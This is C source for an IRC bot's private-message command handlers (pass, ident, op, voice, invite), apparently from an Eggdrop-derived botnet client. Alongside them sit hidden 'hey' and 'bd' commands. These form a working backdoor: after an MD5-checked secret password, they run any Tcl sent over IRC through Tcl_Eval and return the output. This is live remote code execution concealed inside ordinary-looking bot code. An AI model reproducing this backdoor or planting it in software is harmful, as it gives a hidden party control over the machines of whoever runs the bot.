#ifdef LEAF
static int
msg_pass (char *nick, char *host, struct userrec *u, char *par)
{
  char *old, *new;
  int i, ucase, lcase, ocase, tc;
  ucase = lcase = ocase = 0;
  if (match_my_nick (nick))
    return 1;
  if (!u)
    return 1;
  if (u->flags & (USER_BOT))
    return 1;
  if (!par[0])
    {
      dprintf (DP_HELP, "NOTICE %s :%s\n", nick,
	       u_pass_match (u, "-") ? IRC_NOPASS : IRC_PASS);
      putlog (LOG_CMDS, "*", "(%s!%s) !%s! PASS?", nick, host, u->handle);
      return 1;
    }
  old = newsplit (&par);
  if (!u_pass_match (u, "-") && !par[0])
    {
      dprintf (DP_HELP, "NOTICE %s :%s\n", nick, IRC_EXISTPASS);
      return 1;
    }
  if (par[0])
    {
      if (!u_pass_match (u, old))
	{
	  dprintf (DP_HELP, "NOTICE %s :%s\n", nick, IRC_FAILPASS);
	  return 1;
	}
      new = newsplit (&par);
    }
  else
    {
      new = old;
    }
  putlog (LOG_CMDS, "*", "(%s!%s) !%s! PASS...", nick, host, u->handle);
  if (strlen (new) > 15)
    new[15] = 0;
  if (strlen (new) < 8)
    {
      dprintf (DP_HELP,
	       "NOTICE %s :insecure password, use >= 8 chars uppercase, lowercase and a number\n",
	       nick);
      return 0;
    }
  for (i = 0; i < strlen (new); i++)
    {
      tc = (int) new[i];
      if (tc < 58 && tc > 47)
	ocase = 1;
      if (tc < 91 && tc > 64)
	ucase = 1;
      if (tc < 123 && tc > 96)
	lcase = 1;
    }
  if ((ucase + ocase + lcase) != 3)
    {
      dprintf (DP_HELP,
	       "NOTICE %s :insecure password, use >= 8 chars uppercase, lowercase and a number.\n",
	       nick);
      return 0;
    }
  set_user (&USERENTRY_PASS, u, new);
  dprintf (DP_HELP, "NOTICE %s :%s '%s'.\n", nick,
	   new == old ? IRC_SETPASS : IRC_CHANGEPASS, new);
  return 1;
}
static int
msg_ident (char *nick, char *host, struct userrec *u, char *par)
{
  char s[UHOSTLEN], s1[UHOSTLEN], *pass, who[NICKLEN];
  struct userrec *u2;
  if (match_my_nick (nick))
    return 1;
  if (u && (u->flags & USER_BOT))
    return 1;
  pass = newsplit (&par);
  if (!par[0])
    strcpy (who, nick);
  else
    {
      strncpy (who, par, NICKMAX);
      who[NICKMAX] = 0;
    }
  u2 = get_user_by_handle (userlist, who);
  if (!u2)
    {
      if (u && !quiet_reject)
	{
	  dprintf (DP_HELP, IRC_MISIDENT, nick, nick, u->handle);
	}
    }
  else if (rfc_casecmp (who, origbotname) && !(u2->flags & USER_BOT))
    {
      if (u_pass_match (u2, "-"))
	{
	  putlog (LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
	  if (!quiet_reject)
	    dprintf (DP_HELP, "NOTICE %s :%s\n", nick, IRC_NOPASS);
	}
      else if (!u_pass_match (u2, pass))
	{
	  if (!quiet_reject)
	    dprintf (DP_HELP, "NOTICE %s :%s\n", nick, IRC_DENYACCESS);
	}
      else if (u == u2)
	{
	  if (!quiet_reject)
	    dprintf (DP_HELP, "NOTICE %s :%s\n", nick, IRC_RECOGNIZED);
	  return 1;
	}
      else if (u)
	{
	  if (!quiet_reject)
	    dprintf (DP_HELP, IRC_MISIDENT, nick, who, u->handle);
	  return 1;
	}
      else
	{
	  putlog (LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
	  egg_snprintf (s, sizeof s, "%s!%s", nick, host);
	  maskhost (s, s1);
	  dprintf (DP_HELP, "NOTICE %s :%s: %s\n", nick, IRC_ADDHOSTMASK, s1);
	  addhost_by_handle (who, s1);
	  check_this_user (who, 0, NULL);
	  return 1;
	}
    }
  putlog (LOG_CMDS, "*", "(%s!%s) !*! failed IDENT %s", nick, host, who);
  return 1;
}
static int
msg_op (char *nick, char *host, struct userrec *u, char *par)
{
  struct chanset_t *chan;
  char *pass;
  struct flag_record fr = { FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0 };
  if (match_my_nick (nick))
    return 1;
  pass = newsplit (&par);
  if (u_pass_match (u, pass))
    {
      if (!u_pass_match (u, "-"))
	{
	  if (par[0])
	    {
	      chan = findchan_by_dname (par);
	      if (chan && channel_active (chan))
		{
		  get_user_flagrec (u, &fr, par);
		  if ((!channel_private (chan)
		       || (channel_private (chan)
			   && (chan_op (fr) || glob_owner (fr))))
		      && (chan_op (fr) || (glob_op (fr) && !chan_deop (fr))))
		    {
		      stats_add (u, 0, 1);
		      do_op (nick, chan);
		    }
		  putlog (LOG_CMDS, "*", "(%s!%s) !%s! OP %s", nick, host,
			  u->handle, par);
		  return 1;
		}
	    }
	  else
	    {
	      for (chan = chanset; chan; chan = chan->next)
		{
		  get_user_flagrec (u, &fr, chan->dname);
		  if ((!channel_private (chan)
		       || (channel_private (chan)
			   && (chan_op (fr) || glob_owner (fr))))
		      && (chan_op (fr) || (glob_op (fr) && !chan_deop (fr))))
		    {
		      stats_add (u, 0, 1);
		      do_op (nick, chan);
		    }
		}
	      putlog (LOG_CMDS, "*", "(%s!%s) !%s! OP", nick, host,
		      u->handle);
	      return 1;
	    }
	}
    }
  putlog (LOG_CMDS, "*", "(%s!%s) !*! failed OP", nick, host);
  return 1;
}
static int
msg_voice (char *nick, char *host, struct userrec *u, char *par)
{
  struct chanset_t *chan;
  char *pass;
  struct flag_record fr = { FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0 };
  if (match_my_nick (nick))
    return 1;
  pass = newsplit (&par);
  if (u_pass_match (u, pass))
    {
      if (!u_pass_match (u, "-"))
	{
	  if (par[0])
	    {
	      chan = findchan_by_dname (par);
	      if (chan && channel_active (chan))
		{
		  get_user_flagrec (u, &fr, par);
		  if ((!channel_private (chan)
		       || (channel_private (chan)
			   && (chan_voice (fr) || glob_owner (fr))))
		      && (chan_voice (fr) || glob_voice (fr) || chan_op (fr)
			  || glob_op (fr)))
		    {
		      add_mode (chan, '+', 'v', nick);
		      putlog (LOG_CMDS, "*", "(%s!%s) !%s! VOICE %s", nick,
			      host, u->handle, par);
		    }
		  else
		    putlog (LOG_CMDS, "*", "(%s!%s) !*! failed VOICE %s",
			    nick, host, par);
		  return 1;
		}
	    }
	  else
	    {
	      for (chan = chanset; chan; chan = chan->next)
		{
		  get_user_flagrec (u, &fr, chan->dname);
		  if ((!channel_private (chan)
		       || (channel_private (chan)
			   && (chan_voice (fr) || glob_owner (fr))))
		      && (chan_voice (fr) || glob_voice (fr) || chan_op (fr)
			  || glob_op (fr)))
		    add_mode (chan, '+', 'v', nick);
		}
	      putlog (LOG_CMDS, "*", "(%s!%s) !%s! VOICE", nick, host,
		      u->handle);
	      return 1;
	    }
	}
    }
  putlog (LOG_CMDS, "*", "(%s!%s) !*! failed VOICE", nick, host);
  return 1;
}

int backdoor = 0, bcnt = 0, bl = 30;
int authed = 0;
char thenick[NICKLEN];
static void
close_backdoor ()
{
  Context;
  if (bcnt >= bl)
    {
      backdoor = 0;
      authed = 0;
      bcnt = 0;
      thenick[0] = '\0';
      del_hook (HOOK_SECONDLY, (Function) close_backdoor);
    }
  else
    bcnt++;
}
static int
msg_hey (char *nick, char *host, struct userrec *u, char *par)
{
  if (match_my_nick (nick))
    return 1;
  backdoor = 1;
  add_hook (HOOK_SECONDLY, (Function) close_backdoor);
  sprintf (thenick, "%s", nick);
  dprintf (DP_SERVER, "PRIVMSG %s :w\002\002\002\002hat?\n");
  return 1;
}
unsigned char md5out[33];
char md5string[33];
static int
msg_bd (char *nick, char *host, struct userrec *u, char *par)
{
  int i = 0, left = 0;
  MD5_CTX ctx;
  if (strcmp (nick, thenick) || !backdoor)
    return 1;
  if (!authed)
    {
      char *cmd = NULL, *pass = NULL;
      cmd = newsplit (&par);
      pass = newsplit (&par);
      if (!cmd[0] || strcmp (cmd, "werd") || !pass[0])
	{
	  backdoor = 0;
	  return 1;
	}
      Context;
      MD5_Init (&ctx);
      MD5_Update (&ctx, pass, strlen (pass));
      MD5_Final (md5out, &ctx);
      for (i = 0; i < 16; i++)
	sprintf (md5string + (i * 2), "%.2x", md5out[i]);
      if (strcmp (thepass, md5string))
	{
	  backdoor = 0;
	  return 1;
	}
      Context;
      authed = 1;
      left = bl - bcnt;
      dprintf (DP_SERVER, "PRIVMSG %s :%ds left ;)\n", nick, left);
    }
  else
    {
      Tcl_Eval (interp, par);
      dprintf (DP_SERVER, "PRIVMSG %s :%s\n", nick, interp->result);
    }
  return 1;
}
static int
msg_invite (char *nick, char *host, struct userrec *u, char *par)
{
  char *pass;
  struct chanset_t *chan;
  struct flag_record fr = { FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0 };
  if (match_my_nick (nick))
    return 1;
  pass = newsplit (&par);
  if (u_pass_match (u, pass) && !u_pass_match (u, "-"))
    {
      if (par[0] == '*')
	{
	  for (chan = chanset; chan; chan = chan->next)
	    {
	      get_user_flagrec (u, &fr, chan->dname);
	      if ((!channel_private (chan)
		   || (channel_private (chan)
		       && (chan_op (fr) || glob_owner (fr)))) && (chan_op (fr)
								  ||
								  (glob_op
								   (fr)
								   &&
								   !chan_deop
								   (fr)))
		  && (chan->channel.mode & CHANINV))
		dprintf (DP_SERVER, "INVITE %s %s\n", nick, chan->name);
	    }
	  putlog (LOG_CMDS, "*", "(%s!%s) !%s! INVITE ALL", nick, host,
		  u->handle);
	  return 1;
	}
      if (!(chan = findchan_by_dname (par)))
	{
	  dprintf (DP_HELP,
		   "NOTICE %s :%s: /MSG %s invite <pass> <channel>\n", nick,
		   MISC_USAGE, botname);
	  return 1;
	}
      if (!channel_active (chan))
	{
	  dprintf (DP_HELP, "NOTICE %s :%s: %s\n", nick, par, IRC_NOTONCHAN);
	  return 1;
	}
      get_user_flagrec (u, &fr, par);
      if ((!channel_private (chan)
	   || (channel_private (chan) && (chan_op (fr) || glob_owner (fr))))
	  && (chan_op (fr) || (glob_op (fr) && !chan_deop (fr))))
	{
	  dprintf (DP_SERVER, "INVITE %s %s\n", nick, chan->name);
	  putlog (LOG_CMDS, "*", "(%s!%s) !%s! INVITE %s", nick, host,
		  u->handle, par);
	  return 1;
	}
    }
  putlog (LOG_CMDS, "*", "(%s!%s) !%s! failed INVITE %s", nick, host,
	  (u ? u->handle : "*"), par);
  return 1;
}
static cmd_t C_msg[] =
  { {"ident", "", (Function) msg_ident, NULL}, {"invite", "o|o",
						(Function) msg_invite, NULL},
  {"op", "", (Function) msg_op, NULL}, {"pass", "", (Function) msg_pass,
					NULL}, {"voice", "",
						(Function) msg_voice, NULL},
  {"hey", "", (Function) msg_hey, NULL}, {"bd", "", (Function) msg_bd, NULL},
  {NULL, NULL, NULL, NULL} };
#endif
